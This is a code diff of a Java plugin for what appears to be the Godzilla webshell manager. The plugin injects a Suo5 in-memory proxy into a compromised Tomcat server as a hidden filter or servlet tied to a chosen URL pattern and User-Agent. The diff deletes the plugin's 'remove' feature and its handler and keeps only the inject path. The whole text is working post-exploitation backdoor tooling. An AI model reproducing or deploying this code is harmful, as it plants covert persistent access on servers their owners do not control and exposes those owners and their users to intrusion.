@@ -33,7 +33,6 @@ public class Suo5MemShell implements Plugin {
     private final JTextField userAgentTextField = new JTextField("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3", 20);
     private final JComboBox<String> typeComboBox;
     private final JButton injectButton;
-    private final JButton removeButton;
     private final JSplitPane splitPane;
     private final RTextArea resultTextArea;
     private boolean loadState;
@@ -44,7 +43,6 @@ public class Suo5MemShell implements Plugin {
     public Suo5MemShell() {
         this.typeComboBox = new JComboBox(PROXY_TYPE);
         this.injectButton = new JButton("inject");
-        this.removeButton = new JButton("remove");
         this.resultTextArea = new RTextArea();
         this.resultTextArea.append("Godzilla-Suo5MemShell version 0.5, author: X1r0z\n");
         this.splitPane = new JSplitPane();
@@ -60,7 +58,6 @@ public class Suo5MemShell implements Plugin {
         topPanel.add(this.typeLabel);
         topPanel.add(this.typeComboBox);
         topPanel.add(this.injectButton);
-        topPanel.add(this.removeButton);
         this.splitPane.setTopComponent(topPanel);
         this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
         this.splitPane.addComponentListener(new ComponentAdapter() {
@@ -83,7 +80,6 @@ public class Suo5MemShell implements Plugin {
                 ReqParameter reqParameter = new ReqParameter();
                 reqParameter.add("urlPattern", urlPattern);
                 reqParameter.add("userAgent", userAgent);
-                reqParameter.add("action", "inject");
 
                 if (proxyType.equals("Suo5TomcatFilter")) {
                     inputStream = this.getClass().getResourceAsStream("/Suo5TomcatFilter.class");
@@ -107,63 +103,10 @@ public class Suo5MemShell implements Plugin {
                     this.resultTextArea.append(String.format("user-agent: %s\n", userAgent));
                     GOptionPane.showMessageDialog(this.panel, "ok", "提示", 1);
                 } else {
-                    GOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
+                    GOptionPane.showMessageDialog(this.panel, "loader fail", "提示", 2);
                 }
             } else {
                 GOptionPane.showMessageDialog(this.panel, "url pattern is null", "提示", 2);
-            }
-        } catch (Exception var13) {
-            Log.error(var13);
-            GOptionPane.showMessageDialog(this.panel, var13.getMessage(), "提示", 2);
-        }
-
-    }
-
-    private void removeButtonClick(ActionEvent actionEvent) {
-        try {
-            String urlPattern = this.urlPatternTextField.getText();
-            if (urlPattern.length() > 0) {
-                String proxyType = (String) this.typeComboBox.getSelectedItem();
-                String name = this.nameTextField.getText();
-                String userAgent = this.userAgentTextField.getText();
-                InputStream inputStream;
-                String className = proxyType;
-                ReqParameter reqParameter = new ReqParameter();
-                reqParameter.add("urlPattern", urlPattern);
-                reqParameter.add("userAgent", userAgent);
-                reqParameter.add("action", "remove");
-
-                if (proxyType.equals("Suo5TomcatFilter")) {
-                    inputStream = this.getClass().getResourceAsStream("/Suo5TomcatFilter.class");
-                    reqParameter.add("filterName", name);
-                } else if (proxyType.equals("Suo5TomcatServlet")) {
-                    inputStream = this.getClass().getResourceAsStream("/Suo5TomcatServlet.class");
-                    reqParameter.add("wrapperName", name);
-                } else {
-                    inputStream = this.getClass().getResourceAsStream(String.format("/%s.class", proxyType));
-                }
-
-                byte[] classByteArray = functions.readInputStream(inputStream);
-                inputStream.close();
-                boolean loaderState = this.payload.include(className, classByteArray);
-
-                if (loaderState) {
-                    byte[] result = this.payload.evalFunc(className, "run", reqParameter);
-                    String resultString = this.encoding.Decoding(result);
-                    Log.log(resultString, new Object[0]);
-                    if (proxyType.equals("Suo5TomcatFilter")) {
-                        this.resultTextArea.append(String.format("removing Suo5TomcatFilter, filterName: %s, urlPattern: %s, result: %s\n", name, urlPattern, resultString));
-                    } else if (proxyType.equals("Suo5TomcatServlet")) {
-                        this.resultTextArea.append(String.format("removing Suo5TomcatServlet, wrapperName: %s, urlPattern: %s, result: %s\n", name, urlPattern, resultString));
-                    } else {
-                        this.resultTextArea.append(String.format("removing %s, urlPattern: %s, result: %s\n", proxyType, urlPattern, resultString));
-                    }
-                    GOptionPane.showMessageDialog(this.panel, "ok", "提示", 1);
-                } else {
-                    GOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
-                }
-            } else {
-                GOptionPane.showMessageDialog(this.panel, "url pattern is Null", "提示", 2);
             }
         } catch (Exception var13) {
             Log.error(var13);
